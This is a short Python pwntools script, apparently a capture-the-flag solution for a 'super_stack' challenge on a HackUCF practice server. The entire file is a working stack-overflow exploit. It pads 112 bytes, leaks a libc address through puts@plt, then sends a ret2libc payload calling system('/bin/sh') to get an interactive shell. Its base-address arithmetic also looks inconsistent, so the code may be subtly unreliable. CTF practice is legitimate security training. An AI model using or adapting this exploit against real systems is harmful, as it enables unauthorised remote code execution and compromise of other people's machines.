from pwn import *

def main():
    #r = process("./super_stack")
    r = remote("ctf.hackucf.org",9005)
    #libc = ELF("libpwnableharness32.so")
    #libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    r.recvuntil("buf: ")
    buff = int(r.recvline().strip(),16)

    p = "A" * 112
    #p += p32(addr)
    p += p32(0x80484a0) # puts@plt
    p += p32(0x0804862C) # main
    #p += p32(0x080485EB) # handle
    p += p32(0x8049968) # __libc_start_main got

    r.sendline(p)
    r.recvuntil("returning NOW\n")

    addr = u32(r.recv(4))
    print(hex(addr))

    #base = addr - libc.symbols['__libc_start_main']
    base = addr
    system = base + 0x22840 #libc.symbols['system']
    binsh = base + 	0x1434ff #libc.search('/bin/sh').next()

    p = ""
    p += "A" * 112
    p += p32(system)
    p += "B" * 4
    p += p32(binsh)

    r.sendline(p)

    r.interactive()


if __name__ == "__main__":
    main()
